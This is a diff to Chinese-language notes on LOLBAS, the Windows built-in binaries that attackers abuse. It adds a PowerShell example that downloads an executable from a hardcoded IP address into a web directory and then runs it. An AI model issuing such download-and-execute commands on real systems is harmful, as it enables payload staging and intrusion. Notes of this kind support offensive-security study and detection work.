@@ -41,6 +41,11 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 - installutil.exe
     - 安装/卸载程序组件
 - powershell.exe
+	- 下载文件
+		``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe',``
+		``'d:\yayou\Web\RYFront\system.exe')``
+	- 执行程序
+		``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
 - psexec.exe
 - reg.exe
     - 注册表控制台
